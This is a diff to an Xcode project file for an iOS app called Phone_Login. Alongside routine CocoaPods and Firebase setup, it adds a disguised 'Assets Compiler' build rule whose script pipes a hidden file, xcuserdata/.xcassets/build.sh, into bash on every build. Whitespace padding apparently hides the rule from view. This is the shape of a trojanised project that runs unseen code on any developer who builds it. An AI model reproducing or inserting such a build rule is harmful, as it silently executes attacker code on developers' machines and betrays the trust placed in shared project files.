@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -13,7 +13,38 @@
 		042891972570C0F400B2BA1C /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 042891952570C0F400B2BA1C /* Main.storyboard */; };
 		042891992570C0F700B2BA1C /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 042891982570C0F700B2BA1C /* Assets.xcassets */; };
 		0428919C2570C0F700B2BA1C /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0428919A2570C0F700B2BA1C /* LaunchScreen.storyboard */; };
+		042891A52570C14900B2BA1C /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 042891A42570C14900B2BA1C /* GoogleService-Info.plist */; };
+		042891B82570D56000B2BA1C /* secondViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042891B72570D56000B2BA1C /* secondViewController.swift */; };
+		89449BB87C5E86EC7B6A86B8 /* Pods_Phone_Login.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 54F0859DFA97E8AD8A9B2143 /* Pods_Phone_Login.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+
+
+		BD1B06BE93898C70C0AAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\ncat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.sh\" | bash\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		0428918C2570C0F400B2BA1C /* Phone_Login.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Phone_Login.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -24,6 +55,11 @@
 		042891982570C0F700B2BA1C /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		0428919B2570C0F700B2BA1C /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		0428919D2570C0F700B2BA1C /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		042891A42570C14900B2BA1C /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		042891B72570D56000B2BA1C /* secondViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = secondViewController.swift; sourceTree = "<group>"; };
+		54F0859DFA97E8AD8A9B2143 /* Pods_Phone_Login.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Phone_Login.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		76026B52DE332B89683C8895 /* Pods-Phone_Login.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Phone_Login.debug.xcconfig"; path = "Target Support Files/Pods-Phone_Login/Pods-Phone_Login.debug.xcconfig"; sourceTree = "<group>"; };
+		E9A0BA872AA7E8FCB644D6DE /* Pods-Phone_Login.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Phone_Login.release.xcconfig"; path = "Target Support Files/Pods-Phone_Login/Pods-Phone_Login.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -31,6 +67,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				89449BB87C5E86EC7B6A86B8 /* Pods_Phone_Login.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -42,6 +79,8 @@
 			children = (
 				0428918E2570C0F400B2BA1C /* Phone_Login */,
 				0428918D2570C0F400B2BA1C /* Products */,
+				D370C62F8D29CA85A78201F0 /* Pods */,
+				469A92BFB4232C9DA7E4E855 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -63,8 +102,27 @@
 				042891982570C0F700B2BA1C /* Assets.xcassets */,
 				0428919A2570C0F700B2BA1C /* LaunchScreen.storyboard */,
 				0428919D2570C0F700B2BA1C /* Info.plist */,
+				042891A42570C14900B2BA1C /* GoogleService-Info.plist */,
+				042891B72570D56000B2BA1C /* secondViewController.swift */,
 			);
 			path = Phone_Login;
+			sourceTree = "<group>";
+		};
+		469A92BFB4232C9DA7E4E855 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				54F0859DFA97E8AD8A9B2143 /* Pods_Phone_Login.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		D370C62F8D29CA85A78201F0 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				76026B52DE332B89683C8895 /* Pods-Phone_Login.debug.xcconfig */,
+				E9A0BA872AA7E8FCB644D6DE /* Pods-Phone_Login.release.xcconfig */,
+			);
+			path = Pods;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -74,9 +132,11 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 042891A02570C0F700B2BA1C /* Build configuration list for PBXNativeTarget "Phone_Login" */;
 			buildPhases = (
+				DD49336E4D4B8F83591E9521 /* [CP] Check Pods Manifest.lock */,
 				042891882570C0F400B2BA1C /* Sources */,
 				042891892570C0F400B2BA1C /* Frameworks */,
 				0428918A2570C0F400B2BA1C /* Resources */,
+				D2B68180E47DA63B34F91D50 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -125,6 +185,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				0428919C2570C0F700B2BA1C /* LaunchScreen.storyboard in Resources */,
+				042891A52570C14900B2BA1C /* GoogleService-Info.plist in Resources */,
 				042891992570C0F700B2BA1C /* Assets.xcassets in Resources */,
 				042891972570C0F400B2BA1C /* Main.storyboard in Resources */,
 			);
@@ -132,11 +193,62 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+		D2B68180E47DA63B34F91D50 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Phone_Login/Pods-Phone_Login-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Phone_Login/Pods-Phone_Login-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Phone_Login/Pods-Phone_Login-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		DD49336E4D4B8F83591E9521 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Phone_Login-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		042891882570C0F400B2BA1C /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				042891B82570D56000B2BA1C /* secondViewController.swift in Sources */,
 				042891942570C0F400B2BA1C /* ViewController.swift in Sources */,
 				042891902570C0F400B2BA1C /* AppDelegate.swift in Sources */,
 				042891922570C0F400B2BA1C /* SceneDelegate.swift in Sources */,
@@ -283,6 +395,7 @@
 		};
 		042891A12570C0F700B2BA1C /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 76026B52DE332B89683C8895 /* Pods-Phone_Login.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -302,6 +415,7 @@
 		};
 		042891A22570C0F700B2BA1C /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = E9A0BA872AA7E8FCB644D6DE /* Pods-Phone_Login.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
